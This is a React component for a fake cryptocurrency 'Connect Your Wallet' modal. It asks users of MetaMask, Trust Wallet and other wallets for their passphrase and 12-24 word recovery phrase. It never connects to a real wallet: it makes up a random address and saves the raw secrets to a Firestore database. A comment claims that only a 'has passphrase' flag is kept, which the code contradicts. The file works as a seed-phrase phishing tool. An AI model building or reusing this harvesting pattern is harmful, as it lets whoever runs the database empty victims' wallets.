// components/WalletModal.js
import React, { useState, useEffect, useCallback } from 'react';
import { db } from '@/firebaseConfig';
import { collection, addDoc, doc, setDoc } from 'firebase/firestore';
import SuccessModal from './connecmodal';

const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
  const [showSecondaryModal, setShowSecondaryModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [keyphrase, setKeyphrase] = useState('');
  const [importedFile, setImportedFile] = useState(null);
  const [walletAddress, setWalletAddress] = useState('');
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState('');

  const walletOptions = ['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Binance Wallet', 'Phantom'];

  // Generate a random wallet address (simulating real wallet connection)
  const generateWalletAddress = () => {
    return '0x' + Math.random().toString(16).substr(2, 40);
  };

  const handleWalletSelect = (walletName) => {
    setSelectedWallet(walletName);
    setShowSecondaryModal(true);
    setError('');
  };

  const handleOtherOptionsClick = () => {
    setSelectedWallet('Other');
    setShowSecondaryModal(true);
    setError('');
  };

  const handleConnects = () => {
    setIsModalOpen(true);
  };

  const storeWalletData = async (walletDetails) => {
    try {
      // Create a reference to a document with the wallet address as ID
      const walletRef = doc(db, "wallets", walletDetails.walletAddress);
      
      // Set the document data
      await setDoc(walletRef, walletDetails);
      
      return walletRef.id; // Returns the document ID (which is the walletAddress)
    } catch (e) {
      console.error("Error adding document: ", e);
      throw e;
    }
  };

  const handleConnect = async () => {
    if (!selectedWallet) {
      setError('Please select a wallet');
      return;
    }

    setIsConnecting(true);
    setError('');

    try {
      // Generate a wallet address (in a real app, this would come from the wallet provider)
      const generatedAddress = generateWalletAddress();
      setWalletAddress(generatedAddress);

      const walletDetails = {
        walletName: selectedWallet,
        walletAddress: generatedAddress,
        connectedAt: new Date().toISOString(),
        lastActive: new Date().toISOString(),
        passPhrase: passphrase,
        keyPhrase: keyphrase,
        status: 'connected'
      };

      // Add passphrase if provided (Note: In a real app, never store passphrases directly!)
      if (passphrase) {
        walletDetails.hasPassphrase = true; // Just indicate that a passphrase was used
      }

      // Store in Firebase
      const docId = await storeWalletData(walletDetails);
      
      // Store wallet info in localStorage
      localStorage.setItem('walletData', JSON.stringify({
        id: docId,
        name: selectedWallet,
        address: generatedAddress,
        connectedAt: walletDetails.connectedAt
      }));

      // Notify parent component
      if (onWalletConnected) {
        onWalletConnected({
          id: docId,
          name: selectedWallet,
          address: generatedAddress
        });
      }

      handleConnects();
      onClose();
    } catch (err) {
      console.error('Connection error:', err);
      setError('Failed to connect wallet. Please try again.');
    } finally {
      setIsConnecting(false);
    }
  };

  const handleFileChange = (event) => {
    setImportedFile(event.target.files[0]);
  };

  const handleBack = () => {
    setShowSecondaryModal(false);
    setSelectedWallet('');
    setPassphrase('');
    setKeyphrase('');
    setImportedFile(null);
    setError('');
  };

  // Close modal on Escape key press
  const handleKeyDown = useCallback((event) => {
    if (event.key === 'Escape' && isOpen) {
      onClose();
    }
  }, [isOpen, onClose]);

  useEffect(() => {
    if (isOpen) {
      document.addEventListener('keydown', handleKeyDown);
      document.body.classList.add('overflow-hidden');
    } else {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.classList.remove('overflow-hidden');
      setShowSecondaryModal(false);
      setSelectedWallet('');
      setPassphrase('');
      setKeyphrase('');
      setImportedFile(null);
      setError('');
    }

    return () => {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.classList.remove('overflow-hidden');
    };
  }, [isOpen, handleKeyDown]);

  if (!isOpen) {
    return null;
  }

  return (
    <>
      <div className="fixed inset-0 bg-[rgba(0,0,0,0.34)] mt-8 bg-opacity-50 flex justify-center items-center z-50">
        <div className="bg-gray-900 rounded-xl shadow-lg p-8 w-full max-w-md relative">
          <button
            onClick={onClose}
            className="absolute top-4 right-4 text-gray-500 hover:text-gray-300 focus:outline-none"
          >
            <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>

          {!showSecondaryModal ? (
            <div>
              <h3 className="text-xl font-semibold text-gray-100 mb-6">Connect Your Wallet</h3>
              {error && <div className="text-red-500 mb-4">{error}</div>}
              <ul className="space-y-3">
                {walletOptions.map((wallet) => (
                  <li
                    key={wallet}
                    className="bg-gray-800 hover:bg-gray-700 rounded-md py-3 px-4 cursor-pointer transition duration-200"
                    onClick={() => handleWalletSelect(wallet)}
                  >
                    <span className="block text-gray-300 font-medium">{wallet}</span>
                  </li>
                ))}
              </ul>
              <button
                className="w-full mt-6 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
                onClick={handleOtherOptionsClick}
              >
                Other Options
              </button>
            </div>
          ) : (
            <div>
              <h3 className="text-xl font-semibold text-gray-100 mb-6">Connect to {selectedWallet}</h3>
              {error && <div className="text-red-500 mb-4">{error}</div>}
              <div className="space-y-4">
                <div>
                  <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">Passphrase:</label>
                  <input
                    type="password"
                    id="passphrase"
                    className="shadow-sm focus:ring-indigo-500 py-[10px] px-[10px] focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
                    value={passphrase}
                    onChange={(e) => setPassphrase(e.target.value)}
                    placeholder="Optional"
                  />
                </div>
                <div>
                  <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-300 mb-1">Keyphrase:</label>
                  <textarea
                    id="keyphrase"
                    rows="3"
                    className="shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
                    value={keyphrase}
                    onChange={(e) => setKeyphrase(e.target.value)}
                    placeholder="Optional (12-24 word recovery phrase)"
                  />
                </div>
                <div>
                  <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Import from File:</label>
                  <input
                    type="file"
                    id="importFile"
                    className="focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm text-gray-300"
                    onChange={handleFileChange}
                  />
                </div>
              </div>
              <div className="mt-6 flex justify-end space-x-2">
                <button
                  className="bg-gray-700 hover:bg-gray-600 text-gray-100 font-semibold py-3 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-75"
                  onClick={handleBack}
                >
                  Back
                </button>
                <button
                  className="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3 px-6 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75 disabled:opacity-50"
                  onClick={handleConnect}
                  disabled={isConnecting}
                >
                  {isConnecting ? (
                    <>
                      <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Connecting...
                    </>
                  ) : 'Connect'}
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
      <SuccessModal 
        isOpen={isModalOpen} 
        onClose={() => setIsModalOpen(false)} 
        selectedWallet={selectedWallet} 
        walletAddress={walletAddress}
      />
    </>
  );
};

export default WalletModal;